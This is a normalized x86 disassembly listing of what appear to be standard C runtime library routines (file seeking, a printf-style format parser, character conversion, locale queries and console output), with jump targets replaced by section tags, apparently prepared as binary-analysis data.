je r-xdata
sub_10031912
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_10032ee4
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_10026065
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_1002608b
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_10031997
push 0x14
push r--data
call sub_10028b48
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_10026078
and [ eax ] 0x0
call sub_10026065
mov [ eax ] 0x9
call sub_10026078
mov [ eax ] edi
call sub_10026065
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10020579
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_10028b8d
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_10032f5b
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10026078
mov [ eax ] edi
call sub_10026065
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_10020579
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_10026065
mov [ eax ] 0x9
call sub_10026078
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10031912
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10031aa6
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_10031ab0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_10026065
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_10026065
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_10020579
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_10031b2a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_10026065
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10020579
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_10026065
mov [ eax ] 0x2a
call sub_10026065
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_10026065
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10020579
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_100209e0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_100209e0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_10031cb3
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x250 ]
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x238 ] eax
call sub_10023358
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_10026065
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
xor eax eax
cmp ebx eax
je r-xdata
push esi
call sub_1002ae89
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x254 ] eax
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10020040
leave
retn
cmp [ ebp - 0x244 ] 0x0
je r-xdata
inc ebx
xor eax eax
cmp [ ebp - 0x228 ] eax
mov [ ebp - 0x23c ] ebx
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x228 ]
mov eax [ ebp - 0x248 ]
and [ eax + 0x70 ] 0xfffffffd
xor esi esi
cmp [ ebp - 0x240 ] esi
je r-xdata
mov cl dl
sub cl 0x20
cmp cl 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x240 ] 0x7
je r-xdata
mov ecx [ ebp - 0x240 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x240 ] eax
cmp eax esi
je r-xdata
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
call sub_10026065
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
push esi
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
call sub_10020579
add esp 0x14
cmp [ ebp - 0x244 ] 0x0
je r-xdata
mov ebx [ ebp - 0x23c ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_10032863 ]
mov edi [ ebp - 0x224 ]
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x26c ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x238 ] 0x0
lea eax [ ebp - 0x250 ]
push eax
movzx eax dl
push eax
call sub_10030985
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x234 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x234 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x234 ] edi
test edi edi
jge r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x218 ] edi
test edi edi
jge r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x260 ]
lea esi [ ebp - 0x228 ]
call sub_10029ba9
jmp r-xdata
mov ecx [ ebp - 0x260 ]
lea esi [ ebp - 0x228 ]
call sub_10029ba9
mov al [ ebx ]
inc ebx
mov [ ebp - 0x23c ] ebx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x234 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
inc ebx
inc ebx
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x23c ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
inc ebx
inc ebx
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x23c ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x23c ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x224 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x21c ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x220 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] 0x10
je r-xdata
cmp [ ebp - 0x258 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x224 ] edi
mov [ ebp - 0x25c ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x25c ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x25c ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x230 ] 0x2
jmp r-xdata
cmp [ ebp - 0x254 ] 0x0
je r-xdata
mov eax [ ebp - 0x210 ]
test al 0x40
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea ebx [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x21c ] ebx
mov [ ebp - 0x264 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x224 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x224 ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x26c ] 0x1
mov [ ebp - 0x211 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x21c ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp - 0x21c ]
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push [ ebp - 0x254 ]
call sub_100207fd
and [ ebp - 0x254 ] 0x0
pop ecx
mov ebx [ ebp - 0x234 ]
sub ebx [ ebp - 0x220 ]
sub ebx [ ebp - 0x230 ]
test [ ebp - 0x210 ] 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x21c ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x230 ]
mov edi [ ebp - 0x260 ]
lea eax [ ebp - 0x228 ]
lea ecx [ ebp - 0x22c ]
call sub_10029c02
test [ ebp - 0x210 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x260 ]
lea eax [ ebp - 0x228 ]
push ebx
push 0x20
call sub_10029bdc
add esp 0xc
test al 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov [ ebp - 0x278 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x274 ] eax
lea eax [ ebp - 0x250 ]
push eax
push [ ebp - 0x26c ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x224 ] edi
push eax
push [ ebp - 0x264 ]
lea eax [ ebp - 0x278 ]
push ebx
push eax
push [ rw-data ]
call sub_10027c38
pop ecx
call eax
mov edi [ ebp - 0x210 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x224 ] edi
call sub_10031b14
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x220 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x21c ] ecx
je r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x224 ] edi
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x21c ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x238 ] 0x0
mov eax [ ebp - 0x220 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x230 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x220 ] esi
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x238 ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x238 ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x220 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call sub_10031c96
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x240 ] 0x0
inc eax
inc eax
inc eax
mov ecx [ ebp - 0x21c ]
push eax
lea eax [ ebp - 0x228 ]
call sub_10029c02
pop ecx
test eax eax
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x228 ]
call sub_10029bdc
add esp 0xc
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_10026ca5
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x254 ] eax
push 0x8
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x250 ]
push eax
push ebx
push [ rw-data ]
call sub_10027c38
pop ecx
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x228 ]
mov [ esi ] eax
mov ax [ ebp - 0x228 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x230 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x21c ] eax
jmp r-xdata
mov [ ebp - 0x258 ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x21c ]
mov [ ebp - 0x264 ] eax
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x21c ] eax
mov [ ebp - 0x264 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc ebx
mov [ ebp - 0x21c ] ebx
lea eax [ ebp - 0x250 ]
push eax
push ebx
push [ rw-data ]
call sub_10027c38
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x258 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x220 ]
cdq
push edx
push eax
push ebx
push edi
call sub_100308f0
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x264 ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push edi
push ebx
push 0x20
lea eax [ ebp - 0x228 ]
call sub_10029bdc
add esp 0xc
or [ ebp - 0x228 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x270 ] eax
je r-xdata
pop esi
call sub_100200e0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x25c ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x21c ] esi
je r-xdata
cmp [ ebp - 0x228 ] 0x0
jl r-xdata
push [ ebp - 0x270 ]
lea eax [ ebp - 0x228 ]
lea ecx [ ebp - 0xc ]
call sub_10029c02
cmp [ ebp - 0x264 ] 0x0
pop ecx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x264 ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x270 ]
inc esi
push eax
inc esi
call sub_10031c96
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x21c ]
mov ecx [ ebp - 0x21c ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_10032883
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
call sub_10027c2f
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx eax
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
test edi edi
je r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
test eax eax
je r-xdata
push [ rw-data ]
call sub_10027c38
pop ecx
test eax eax
je r-xdata
push eax
call sub_10027c38
pop ecx
test eax eax
je r-xdata
push eax
call sub_10027c38
push [ rw-data ]
mov esi eax
call sub_10027c38
pop ecx
pop ecx
mov edi eax
test esi esi
je r-xdata
push eax
call sub_10027bbd
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_10027bbd
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_10027bbd
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_10027bbd
pop ecx
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test edi edi
je r-xdata
push r--data
push edi
call esi
push eax
call sub_10027bbd
pop ecx
mov [ rw-data ] eax
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
call esi
test eax eax
je r-xdata
push eax
call sub_10027c38
pop ecx
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
push 0xc
lea ecx [ ebp - 0x14 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
test [ ebp - 0xc ] 0x1
jne r-xdata
sub_100329ec
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_10026065
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_10020579
add esp 0x14
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
pop esi
pop ebp
retn
mov eax [ rw-data ]
jmp r-xdata
sub_10032a37
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10032a6b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
mov ebx [ GetLocaleInfoW@IAT ]
push esi
push edi
xor edi edi
xor esi esi
inc edi
cmp eax esi
jne r-xdata
cmp eax 0x2
je r-xdata
push esi
push esi
push edi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoA@IAT ]
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
cmp eax edi
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
cmp [ ebp + 0x1c ] esi
jne r-xdata
xor eax eax
jmp r-xdata
push esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10020040
leave
retn
jle r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push edi
call sub_10026507
pop ecx
mov eax esi
jmp r-xdata
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_10022f32
pop ecx
cmp eax esi
je r-xdata
call sub_100303a0
mov edi esp
cmp edi esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push 0xffffffff
push edi
push esi
push [ ebp + 0x1c ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp edi esi
je r-xdata
sub_10032baa
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10032a6b
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10032be7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
